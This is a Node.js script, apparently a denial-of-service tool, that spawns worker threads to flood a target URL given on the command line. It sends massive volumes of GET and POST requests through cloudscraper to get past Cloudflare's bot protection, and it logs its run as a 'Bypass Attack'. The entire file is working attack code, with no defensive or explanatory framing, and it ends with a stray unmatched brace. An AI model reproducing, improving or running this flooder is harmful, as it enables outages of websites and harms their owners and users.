const cloudscraper = require('cloudscraper');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

if (isMainThread) {
    const target = process.argv[2];
    const duration = parseInt(process.argv[3]) || 60; // Duration in seconds
    const numThreads = parseInt(process.argv[4]) || 10; // Number of worker threads
    const postMessage = process.argv[5] || 'Default POST message';
    const ratePerThread = 50000; // Requests per second per thread

    if (!target) {
        console.error('Please provide a target URL.');
        process.exit(1);
    }

    console.log('Bypass Attack Started!');
    let totalRequestCount = 0;

    const updateCount = (increment) => {
        totalRequestCount += increment;
        console.log(`Total Requests sent: ${totalRequestCount}`);
    };

    const workerPromises = [];

    for (let i = 0; i < numThreads; i++) {
        workerPromises.push(new Promise((resolve, reject) => {
            const worker = new Worker(__filename, {
                workerData: { target, duration, ratePerThread, postMessage }
            });
            worker.on('message', updateCount);
            worker.on('error', reject);
            worker.on('exit', resolve);
        }));
    }

    Promise.all(workerPromises).then(() => {
        console.log(`Bypass Attack finished. Total requests sent: ${totalRequestCount}`);
        process.exit(0);
    });
} else {
    const { target, duration, ratePerThread, postMessage } = workerData;
    const endTime = Date.now() + duration * 1000;
    let requestCount = 0;

    const sendRequests = async () => {
        while (Date.now() < endTime && requestCount < 500000) {
            try {
                const promises = [];
                for (let i = 0; i < ratePerThread; i++) {
                    promises.push(
                        cloudscraper.get(target)
                            .then(() => { requestCount++; })
                            .catch(() => { requestCount++; })
                    );
                    promises.push(
                        cloudscraper.post(target, { message: postMessage })
                            .then(() => { requestCount++; })
                            .catch(() => { requestCount++; })
                    );
                }
                await Promise.all(promises);
                parentPort.postMessage(ratePerThread * 2); // Sending both GET and POST requests
            } catch (error) {
                console.error(`Error: ${error.message}`);
            }
        }
        parentPort.postMessage(requestCount);
        parentPort.close();
    };

    sendRequests();
                                }
          
